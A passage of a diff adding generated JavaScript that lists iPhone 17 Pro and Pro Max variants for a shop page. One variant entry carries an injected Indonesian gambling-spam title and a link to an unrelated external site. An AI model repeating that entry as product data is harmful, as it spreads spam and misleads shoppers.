+                        var arr = prevPage.split("/");
+                        prevPage = "Cart Page";
+                    } else {
+                        prevPage = "home_page"
+                    }
+                    if (prodList) {
+                        document.getElementById("product_list").setAttribute('value', prodList);
+                    } else {
+                        localStorage.setItem("product-click", prevPage);
+                        document.getElementById("product_list").setAttribute('value', prevPage);
+                    }
+                    $(".product__info-container .product__accordion").each(function (index, item) {
+                        if (index == 0) {
+                            $(item).find("details").attr("open", "open");
+                        }
+                    });
+                    var product_price = $("#price-element").find(".actual_price_bold").text();
+                    document.getElementById("product_price").setAttribute('value', product_price);
+                    var prod_option = [];
+                    var checked_value1 = [];
+                    var prod_option1 = [];
+                    var prod_option2 = [];
+
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033877049524",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyp4x-a",
+                        full_url: "/products/iphone-17-pro-mfyp4x-a",
+                        id: "44033877049524",
+                        product_id: "7986667946164",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 256GB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "1,899.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033873215668",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfym4x-a",
+                        full_url: "/products/iphone-17-pro-mfym4x-a",
+                        id: "44033873215668",
+                        product_id: "7986665980084",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 256GB Silver",
+                        product_type: "iPhone",
+                        product_price: "1,899.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033871610036",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8h4x-a",
+                        full_url: "/products/iphone-17-pro-mg8h4x-a",
+                        id: "44033871610036",
+                        product_id: "7986665160884",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 256GB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "1,749.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033871904948",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyt4x-a",
+                        full_url: "/products/iphone-17-pro-mfyt4x-a",
+                        id: "44033871904948",
+                        product_id: "7986665324724",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 512GB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "2,199.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033870168244",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8j4x-a",
+                        full_url: "/products/iphone-17-pro-mg8j4x-a",
+                        id: "44033870168244",
+                        product_id: "7986664407220",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 256GB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "1,749.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033870004404",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyv4x-a",
+                        full_url: "/products/iphone-17-pro-mfyv4x-a",
+                        id: "44033870004404",
+                        product_id: "7986664341684",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 1TB Silver",
+                        product_type: "iPhone",
+                        product_price: "2,499.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033856995508",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyn4x-a",
+                        full_url: "/products/iphone-17-pro-mfyn4x-a",
+                        id: "44033856995508",
+                        product_id: "7986657853620",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 256GB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "1,899.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "45135258155628",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "https://tunari-online.ro/",
+                        full_url: "/",
+                        id: "45135258155628",
+                        product_id: "8845196638866",
+                        product_sku: "MG8P4X/A",
+                        product_title: "SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI",
+                        product_type: "iPhone",
+                        product_price: "2,349.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033877180596",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8m4x-a",
+                        full_url: "/products/iphone-17-pro-mg8m4x-a",
+                        id: "44033877180596",
+                        product_id: "7986668011700",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 512GB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "2,049.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033875607732",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8n4x-a",
+                        full_url: "/products/iphone-17-pro-mg8n4x-a",
+                        id: "44033875607732",
+                        product_id: "7986667258036",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 512GB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "2,049.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "2TB" : "2TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "2TB" + "Capacity" : "2TB" + "Capacity";
+                    prod_option2.push("2TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033873805492",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg004x-a",
+                        full_url: "/products/iphone-17-pro-mg004x-a",
+                        id: "44033873805492",
+                        product_id: "7986666274996",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 2TB Cosmic Orange",
+                        product_type: "iPhone",
+                        product_price: "3,099.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033872396468",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyx4x-a",
+                        full_url: "/products/iphone-17-pro-mfyx4x-a",
+                        id: "44033872396468",
+                        product_id: "7986665554100",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 1TB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "2,499.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033871151284",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8k4x-a",
+                        full_url: "/products/iphone-17-pro-mg8k4x-a",
+                        id: "44033871151284",
+                        product_id: "7986664931508",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 512GB Silver",
+                        product_type: "iPhone",
+                        product_price: "2,049.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Silver" : "Silver";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Silver" + "Color" : "Silver" + "Color";
+                    prod_option2.push("Silver" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "256GB" : "256GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "256GB" + "Capacity" : "256GB" + "Capacity";
+                    prod_option2.push("256GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033870626996",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8g4x-a",
+                        full_url: "/products/iphone-17-pro-mg8g4x-a",
+                        id: "44033870626996",
+                        product_id: "7986664669364",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 256GB Silver",
+                        product_type: "iPhone",
+                        product_price: "1,749.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033867022516",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8r4x-a",
+                        full_url: "/products/iphone-17-pro-mg8r4x-a",
+                        id: "44033867022516",
+                        product_id: "7986662899892",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro 1TB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "2,349.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "2TB" : "2TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "2TB" + "Capacity" : "2TB" + "Capacity";
+                    prod_option2.push("2TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033864827060",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg014x-a",
+                        full_url: "/products/iphone-17-pro-mg014x-a",
+                        id: "44033864827060",
+                        product_id: "7986661753012",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 2TB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "3,099.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Deep Blue" : "Deep Blue";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Deep Blue" + "Color" : "Deep Blue" + "Color";
+                    prod_option2.push("Deep Blue" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro Max" : "iPhone 17 Pro Max";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro Max" + "Model" : "iPhone 17 Pro Max" + "Model";
+                    prod_option2.push("iPhone 17 Pro Max" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "512GB" : "512GB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "512GB" + "Capacity" : "512GB" + "Capacity";
+                    prod_option2.push("512GB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033863418036",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mfyu4x-a",
+                        full_url: "/products/iphone-17-pro-mfyu4x-a",
+                        id: "44033863418036",
+                        product_id: "7986660966580",
+                        product_sku: "MG8P4X/A",
+                        product_title: "iPhone 17 Pro Max 512GB Deep Blue",
+                        product_type: "iPhone",
+                        product_price: "2,199.00",
+                        productcomPrice: ""
+                    });
+
+                    var product_opt1 = "";
+                    var product_opt2 = "";
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "Cosmic Orange" : "Cosmic Orange";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "Cosmic Orange" + "Color" : "Cosmic Orange" + "Color";
+                    prod_option2.push("Cosmic Orange" + "option1");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "iPhone 17 Pro" : "iPhone 17 Pro";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "iPhone 17 Pro" + "Model" : "iPhone 17 Pro" + "Model";
+                    prod_option2.push("iPhone 17 Pro" + "option2");
+
+
+
+
+
+
+
+                    product_opt1 = product_opt1 != '' ? product_opt1 + "|!" + "1TB" : "1TB";
+                    product_opt2 = product_opt2 != '' ? product_opt2 + "|!" + "1TB" + "Capacity" : "1TB" + "Capacity";
+                    prod_option2.push("1TB" + "option3");
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    prod_option1[product_opt1] = "false";
+
+                    prod_option.push({
+                        variant_id: "44033862533300",
+                        option: product_opt1,
+                        option_new: product_opt2,
+                        product_opt1: "false",
+                        available: "false",
+                        url: "iphone-17-pro-mg8q4x-a",
+                        full_url: "/products/iphone-17-pro-mg8q4x-a",
+                        id: "44033862533300",
